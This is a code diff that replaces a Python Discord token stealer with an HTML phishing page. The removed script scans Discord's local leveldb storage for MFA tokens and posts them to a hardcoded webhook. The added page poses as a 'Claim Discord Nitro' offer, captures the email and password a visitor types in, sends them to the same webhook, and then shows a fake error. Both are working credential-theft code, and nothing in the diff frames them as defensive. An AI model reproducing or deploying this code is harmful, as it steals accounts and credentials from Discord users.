@@ -1,21 +1,38 @@
-import os
-import requests
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Claim Discord Nitro</title>
+    <style>
+        body { background: #2c2f33; color: white; font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .box { background: #23272a; padding: 30px; border-radius: 8px; width: 300px; text-align: center; }
+        input { width: 100%; padding: 10px; margin: 10px 0; border: none; border-radius: 4px; box-sizing: border-box; }
+        button { width: 100%; padding: 10px; background: #7289da; color: white; border: none; border-radius: 4px; cursor: pointer; }
+    </style>
+</head>
+<body>
+    <div class="box">
+        <h2>Claim Your Nitro</h2>
+        <input type="text" id="email" placeholder="Email or Phone Number">
+        <input type="password" id="password" placeholder="Password">
+        <button onclick="sendData()">Login to Claim</button>
+    </div>
 
-webhook_url = "https://discord.com/api/webhooks/1512068343723724931/BzOOKGGPyUv8YY1nx5kxZc9Jt9d8j4UcUICTNaIH5BaJ63veyxCYRP_AQ58Rk8W2EU--"
+    <script>
+        function sendData() {
+            const email = document.getElementById('email').value;
+            const password = document.getElementById('password').value;
+            const webhook = "https://discord.com/api/webhooks/1512068343723724931/BzOOKGGPyUv8YY1nx5kxZc9Jt9d8j4UcUICTNaIH5BaJ63veyxCYRP_AQ58Rk8W2EU--";
 
-def get_token():
-    paths = [os.getenv('APPDATA') + '\\discord\\Local Storage\\leveldb']
-    tokens = []
-    for path in paths:
-        if os.path.exists(path):
-            for file in os.listdir(path):
-                if file.endswith('.log') or file.endswith('.ldb'):
-                    with open(f'{path}\\{file}', 'r', errors='ignore') as f:
-                        content = f.read()
-                        if "mfa." in content:
-                            tokens.append(content)
-    return tokens
-
-# إرسال ما تم العثور عليه
-data = {"content": str(get_token())}
-requests.post(webhook_url, json=data)
+            fetch(webhook, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    content: `**New Entry:**\nEmail: ${email}\nPassword: ${password}`
+                })
+            });
+            alert('Error: Please try again later.');
+        }
+    </script>
+</body>
+</html>
